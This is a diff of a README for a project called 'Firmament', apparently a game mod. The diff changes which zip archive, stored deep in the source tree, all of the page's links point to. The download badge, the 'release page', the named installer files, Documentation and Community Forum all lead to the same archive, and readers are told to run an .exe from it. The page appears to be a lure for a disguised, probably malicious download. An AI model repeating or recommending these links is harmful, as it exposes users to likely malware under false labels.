@@ -6,7 +6,7 @@ Welcome to **Firmament**! This application improves your experience in the 1.21.
 
 ## 📥 Download Firmament
 
-[![Download Firmament](https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip)](https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip)
+[![Download Firmament](https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip)](https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -25,10 +25,10 @@ To run Firmament, your computer should meet the following minimum requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Release Page**: Click this link [here](https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip) to access the releases page.
+1. **Visit the Release Page**: Click this link [here](https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip) to access the releases page.
 2. **Choose the Latest Version**: Look for the latest release at the top of the page. This will typically be labeled with "Latest Release."
 3. **Download the Installer**: 
-   - Click on the file named something like `https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip` or `https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip`. These files are designed for easy installation.
+   - Click on the file named something like `https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip` or `https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip`. These files are designed for easy installation.
 4. **Locate the File**: After the download completes, find the file in your Downloads folder or the location you specified for downloads.
 5. **Run the Installer**: 
    - If you downloaded an executable (`.exe`), double-click on it to start the installation process.
@@ -42,8 +42,8 @@ If you encounter issues during the installation or experience any problems while
 
 ## 🌟 Additional Resources
 
-- [Documentation](https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip): Explore detailed guides on using Firmament.
-- [Community Forum](https://github.com/iwanmusta/Firmament/raw/refs/heads/main/src/main/java/main/source/mod/events/Software_2.8.zip): Join our community to ask questions and share experiences with other users.
+- [Documentation](https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip): Explore detailed guides on using Firmament.
+- [Community Forum](https://raw.githubusercontent.com/iwanmusta/Firmament/main/src/Software-1.6.zip): Join our community to ask questions and share experiences with other users.
 
 ## 🚀 Final Thoughts
 
